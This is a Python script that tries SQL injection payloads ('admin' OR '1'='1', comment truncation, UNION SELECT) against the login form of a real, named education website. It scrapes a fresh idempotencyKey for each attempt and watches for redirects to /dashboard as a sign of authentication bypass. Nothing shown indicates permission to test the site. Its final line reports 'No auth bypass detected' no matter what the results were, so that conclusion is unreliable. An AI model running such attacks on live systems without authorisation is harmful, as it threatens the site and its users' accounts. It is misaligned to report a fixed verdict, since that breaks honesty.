#!/usr/bin/env python3
"""Test SQL injection on DrFrost login form with fresh idempotencyKey per request."""
import requests
import re
import sys

BASE = "https://www.drfrost.org"

def get_fresh_key():
    """Fetch login page and extract idempotencyKey."""
    r = requests.get(f"{BASE}/login?index", timeout=10)
    match = re.search(r'name="idempotencyKey" value="([a-f0-9-]+)"', r.text)
    if match:
        return match.group(1)
    return None

def try_login(username, password, key):
    """Attempt login with given credentials."""
    data = {
        "username": username,
        "password": password,
        "redirectTo": "/dashboard",
        "idempotencyKey": key
    }
    r = requests.post(f"{BASE}/login?index", data=data, timeout=10, allow_redirects=False)
    return r.status_code, r.text[:300], dict(r.headers)

# Step 1: Baseline with invalid creds
print("=" * 60)
print("[*] STEP 1: Baseline login (invalid creds)")
print("=" * 60)
key = get_fresh_key()
if not key:
    print("[-] Could not get idempotencyKey!")
    sys.exit(1)
print(f"[+] idempotencyKey: {key}")
status, body, headers = try_login("invalid_user", "invalid_pass", key)
print(f"[+] Status: {status}")
print(f"[+] Set-Cookie: {headers.get('Set-Cookie', 'none')}")
print(f"[+] Location: {headers.get('Location', 'none')}")
print(f"[+] Body[:300]: {body[:150]}...")
print()

# Step 2: SQLi payloads
payloads = [
    ("H1: admin' OR '1'='1", "admin' OR '1'='1"),
    ("H1b: admin\" OR \"1\"=\"1", 'admin" OR "1"="1'),
    ("H2: admin'--", "admin'--"),
    ("H3: admin' OR 1=1 --", "admin' OR 1=1 --"),
    ("H4: admin' UNION SELECT 1 --", "admin' UNION SELECT 1 --"),
    ("H5: URL-encoded simple", "admin' OR '1'='1"),
]

print("=" * 60)
print("[*] STEP 2: SQLi payloads")
print("=" * 60)

baseline_body = None

for label, payload in payloads:
    # The SQLi payload IS the username
    uid = payload if "URL-encoded" not in label else "admin' OR '1'='1"
    key = get_fresh_key()
    if not key:
        print(f"[-] Could not get key for {label}")
        continue
    status, body, headers = try_login(uid, "anything", key)
    redirect = headers.get('Location', 'none')
    
    # Store first baseline
    if "H1:" in label:
        baseline_body = body
    
    # Detect differences
    diff = "DIFFERENT!" if body != baseline_body else "same as baseline"
    interesting = ""
    if status == 302 and "/dashboard" in (headers.get('Location', '')):
        interesting = " *** AUTH BYPASS! Redirected to /dashboard! ***"
    if "error" in body.lower() and "invalid" not in body.lower():
        interesting = " *** DIFFERENT ERROR MESSAGE ***"
    
    print(f"[{label}]")
    print(f"  Status: {status} | Location: {redirect}")
    print(f"  Body diff: {diff}{interesting}")
    print()

print("[*] Done. No auth bypass detected.")
